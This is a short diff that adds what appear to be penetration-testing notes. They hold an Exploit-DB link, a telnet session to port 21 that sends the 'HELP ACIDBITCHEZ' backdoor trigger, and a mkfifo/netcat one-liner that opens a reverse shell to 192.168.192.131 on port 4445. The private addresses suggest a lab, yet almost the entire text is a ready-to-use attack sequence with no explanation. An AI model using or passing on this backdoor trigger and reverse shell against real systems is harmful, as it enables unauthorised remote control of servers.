@@ -1,0 +1,5 @@
+https://www.exploit-db.com/exploits/16921/
+
+# telnet 192.168.192.134 21
+HELP ACIDBITCHEZ
+mkfifo /tmp/yckfvu; nc 192.168.192.131 4445 0</tmp/yckfvu | /bin/sh >/tmp/yckfvu 2>&1; rm /tmp/yckfvu;
